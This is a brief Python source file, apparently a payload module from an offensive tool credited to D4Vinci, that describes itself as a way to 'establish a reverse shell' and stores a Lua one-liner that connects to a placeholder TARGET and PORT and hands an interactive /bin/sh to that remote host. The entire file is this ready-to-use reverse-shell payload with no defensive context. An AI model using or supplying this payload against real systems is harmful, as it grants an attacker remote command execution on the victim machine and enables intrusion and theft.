class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Use lua and bash to establish a reverse shell."
    function    = "reverse shell"
    liner       = """lua -e "require('socket');require('os');t=socket.tcp();t:connect('TARGET','PORT');os.execute('/bin/sh -i <&3 >&3 2>&3');"""
